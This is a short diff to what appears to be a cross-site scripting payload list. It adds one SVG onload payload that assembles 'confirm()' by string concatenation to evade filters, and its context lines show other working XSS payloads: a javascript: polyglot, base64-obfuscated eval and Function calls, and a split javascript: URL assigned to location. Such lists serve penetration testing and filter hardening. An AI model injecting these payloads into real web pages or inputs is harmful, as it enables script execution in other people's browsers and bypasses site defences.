@@ -70,6 +70,7 @@ String.raw`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0
 <sVg/onload=eval(atob("Y29uZmlybSgp"))><sVg>
 <sVg/onload="eval(atob(atob(btoa(btoa(atob('Y29uZmlybSgp'))))));"><sVg>
 <sVg/onload='(new Function(atob("Y29uZmlybSgp")))();'><sVg>
+<sVg/onload=eval("c".concat("onfirm").concat("()"));><sVg>
 <sVg␌onload=confirm()><sVg>
 <sVg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
 <sVg onload="void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm()//&gt;\x3e';"></sVg>
